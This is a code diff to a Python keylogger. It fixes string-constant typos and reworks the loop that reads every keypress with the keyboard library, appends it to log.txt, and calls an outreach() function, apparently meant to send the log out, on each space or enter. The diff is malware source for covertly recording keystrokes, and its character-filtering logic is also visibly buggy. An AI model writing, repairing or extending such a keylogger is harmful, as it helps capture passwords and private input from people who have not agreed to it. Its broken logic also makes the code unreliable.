@@ -26,33 +26,37 @@ def outreach():
 
 
 def keylogger():
-    
-    allchars = string.ascii_lowerclass + string.ascii_upperclass + string.digits
+
+    allchars = string.ascii_lowercase + string.ascii_uppercase + string.digits
 
     while True:
         file = open('log.txt', 'a')
-    
+
         event = keyboard.read_event()
-    
+
         if event.event_type == keyboard.KEY_DOWN:
             char = keyboard.read_key()
-    
+            for i in allchars:
+                if char == i:
+                    continue
+                else:
+                    char = ''
+            
+
             if event.name == 'space':
                 char = '\n'
+                file.write(char)
                 outreach()
-    
-    
+
+
             elif event.name == 'enter':
                 char = '\n'
-                outreach()
-    
-        
-    
-        for i in allchars:
-            if char == i and char == '\n':
                 file.write(char)
-                file.close()
+                outreach()
+
+            file.write(char)
+            file.close()
 
 if __name__ == '__main__':
-    
+
     keylogger()
